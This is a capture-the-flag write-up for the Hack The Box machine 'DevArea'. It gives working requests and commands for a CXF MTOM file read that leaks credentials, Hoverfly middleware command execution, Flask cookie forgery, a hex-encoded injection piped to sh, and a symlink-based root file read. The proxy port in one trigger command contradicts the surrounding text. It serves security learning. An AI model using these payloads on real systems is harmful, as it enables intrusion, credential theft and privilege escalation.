# Machine: DevArea

Date: 07-06-2026
Platform: HTB
Difficulty: Medium
Author: WhoKn0ws

---

## Recon

### Nmap:

```bash
nmap -sV -sC -p- --min-rate 4000 devarea.htb
```

**Results:**

- Port 21 → FTP (anonymous access enabled)
- Port 22 → SSH
- Port 80 → HTTP (Apache)
- Port 8080 → Jetty SOAP (employee service)
- Port 8888 → Hoverfly dashboard/API
- Port 8500 → Hoverfly proxy listener

**Full port scan:**

Full range scanned directly (`-p- --min-rate 4000`); ports above account for all relevant findings.

**Notes:**

- Added to /etc/hosts: `$MACHINE_IP devarea.htb`

---

## Enumeration

### Anonymous FTP:

Anonymous FTP access exposes `pub/employee-service.jar` — a bundled Apache CXF Jetty application.

**Findings:**

- Strings analysis of the JAR plus the WSDL at `http://devarea.htb:8080/employeeservice?wsdl` confirm a `submitReport` SOAP method
- Port 8888 → Hoverfly dashboard; port 8500 → Hoverfly proxy listener (mock API tooling)

### Vulnerability identification:

- SOAP endpoint (Apache CXF) → potential MTOM/XOP file read, matches **CVE-2022-46364**
- Hoverfly instance → matches known middleware command injection, **CVE-2025-54123**

---

## Exploitation

### CVE-2022-46364 — Apache CXF MTOM/XOP file read

Classic DTD-based XXE is rejected by the SOAP endpoint, but MTOM multipart requests using `xop:Include href="file:///..."` are accepted and allow arbitrary file reads.

**Steps:**

**1. Send a crafted MTOM multipart request targeting a local file (e.g. the Hoverfly systemd unit):**

```bash
curl -s http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="----=LOL"' \
  --data-binary @mtom.xml
```

MTOM body content:

```xml
------=LOL
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"

<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:dev="http://devarea.htb/"
                  xmlns:xop="http://www.w3.org/2004/08/xop/include">
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content><xop:Include href="file:///etc/systemd/system/hoverfly.service"/></content>
        <department>security</department>
        <employeeName>test</employeeName>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
------=LOL--
```

**Result:** The SOAP `<return>` element in the response contains base64-encoded file contents. Decoding the `hoverfly.service` unit file recovers Hoverfly admin credentials (`admin:O7IJ27MyyXiU`) from the `ExecStart` line.

### CVE-2025-54123 — Hoverfly middleware command injection

With valid Hoverfly admin credentials, authenticate to get a token, then set a malicious "middleware" (Hoverfly's request/response processing hook) that executes arbitrary shell commands. The middleware only fires when traffic passes through the Hoverfly proxy listener (port 8500).

**Steps:**

**1. Authenticate and grab a token:**

```bash
TOKEN=$(curl -s http://devarea.htb:8888/api/token-auth \
  -H 'Content-Type: application/json' \
  -d '{"Username":"admin","Password":"O7IJ27MyyXiU"}' | jq -r .token)
```

**2. Set malicious middleware:**

```bash
curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"binary":"bash","script":"id"}'
```

**3. Trigger execution by routing a request through the proxy:**

```bash
curl -s --proxy http://devarea.htb:8888 http://127.0.0.1:8500/
```

**Result:** Commands execute as `dev_ryan`. `user.txt` read successfully:

```bash
cat /home/dev_ryan/user.txt
```

---

## Privilege Escalation

### Enumeration:

`dev_ryan` may run `sudo /opt/syswatch/syswatch.sh logs <file>` as root. A separate internal Flask app, SysWatch, listens on `127.0.0.1:7777` running as user `syswatch`.

**Findings:**

- SysWatch's `/service-status` endpoint builds a shell command with `shell=True`:
  ```python
  subprocess.run([f"systemctl status --no-pager {service}"], shell=True, ...)
  ```
- The service-name filter blocks `/`, `.`, `;`, `&`, `<`, `>`, and uppercase letters across the whole field — but newlines are allowed, and hex-encoded payloads bypass the character filter entirely
- `/etc/syswatch.env` contains `SYSWATCH_SECRET_KEY` — usable to forge a valid Flask admin session cookie without knowing the actual login password (the env file's password is for initial DB seeding only and may not match the live login)

### SysWatch Flask session forgery + command injection + symlink log read:

**1. Read `/etc/syswatch.env` as `dev_ryan` and forge a Flask admin session using `SYSWATCH_SECRET_KEY`.**

> Session cookies must be forged using Flask 3.1.0 on Python 3.12 to match the target's environment — signatures generated with other Flask/Python versions (e.g. local Py3.13 `flask-unsign`) fail validation.

**2. Inject two commands as `syswatch` via the hex-encoded `/service-status` payload:**

```
x
$(echo 6c6e202d736620...|xxd -r -p|sh)
#
```

Decoded, the injected commands create a double symlink under the logs directory:

```bash
ln -sf ../../../root/root.txt /opt/syswatch/logs/target
ln -sf target /opt/syswatch/logs/reader.log
```

> Double symlinks are needed to bypass a single-level symlink check in SysWatch's `view_logs` function.

**3. Trigger the privileged log reader, which follows the symlink chain:**

```bash
sudo /opt/syswatch/syswatch.sh logs reader.log
```

**Successful escalation:** root ✓ — `view_logs` runs as root and prints the contents of `/root/root.txt` through the symlink chain.

---

## Loot / Flags

- **user.txt:** `[FLAG REDACTED]` → `/home/dev_ryan/user.txt`
- **root.txt:** `[FLAG REDACTED]` → `/root/root.txt`

---

## Lessons Learned

- MTOM/XOP file-read (CVE-2022-46364) is a good reminder that blocking classic DTD-based XXE isn't enough — Apache CXF's MTOM multipart handling is a separate attack surface for the same underlying file-read primitive
- Config/systemd unit files leaked via file-read bugs are high-value targets — `ExecStart` lines routinely embed plaintext credentials passed as CLI args
- Command-injection filters that block specific characters across a whole field can often be bypassed by encoding the payload (hex here) and decoding it inline (`xxd -r -p`) — character blocklists are rarely airtight
- When a secret key (e.g. Flask `SECRET_KEY`) leaks, session forgery is possible without ever knowing the real login password — but cookie signing must match the target's exact framework/language version, or the signature won't validate
- Symlink-based file-read protections that only check one level deep can be bypassed with a double symlink — worth testing whenever a "logs" or "read file" feature does a single resolve/exists check before opening
- Always check `sudo -l` early — the privileged script here (`syswatch.sh logs <file>`) was the anchor for the entire root path once combined with the local Flask app's own bugs
